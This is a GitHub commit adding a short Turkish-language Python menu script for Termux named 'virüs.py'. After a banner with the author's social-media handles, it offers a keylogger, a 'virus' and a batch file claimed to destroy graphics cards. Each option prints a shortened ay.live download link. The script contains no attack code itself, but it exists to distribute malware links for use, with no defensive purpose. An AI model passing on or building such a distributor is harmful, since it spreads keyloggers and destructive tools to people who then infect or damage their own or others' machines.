0cd31b20aa0d5b95c052bd57b6c8bafe10708ed8
Swoyzi <103384233+swoyzi@users.noreply.github.com>
2022-07-20 22:11:07 +0300

    Add files via upload

---
+++ virüs.py
@@ -0,0 +1,38 @@
+#!/usr/bin/env python3 
+import os
+
+while True:
+	os.system("pkg install toilet")
+	os.system("clear")
+	os.system("toilet -f mono12 -F gay swoyzi")
+
+
+	print("""
+
+				Telegram=https://t.me/Swoyzi_arsiv
+				lnstegram=swoyzi__
+ 				youtube=https://l24.im/6Wd
+				github=https://github.com/swoyzi
+
+01)keylogger
+02)virüs
+03)✨Ekran kartı yaktıran bat dosyası yakma
+Q)quit
+""")
+	islemno = input("sec birisini aw:")
+
+	if islemno =="02":
+		print("https://ay.live/W116")
+
+	if islemno=="01":
+		print("https://ay.live/1BRdp")
+
+	if islemno=="03":
+		print("https://ay.live/fSBIV")
+	
+	elif islemno== "q"  or islemno== "Q":
+
+		quit()
+	else:
+
+		input("hatalı secim devam etmek icin enter")
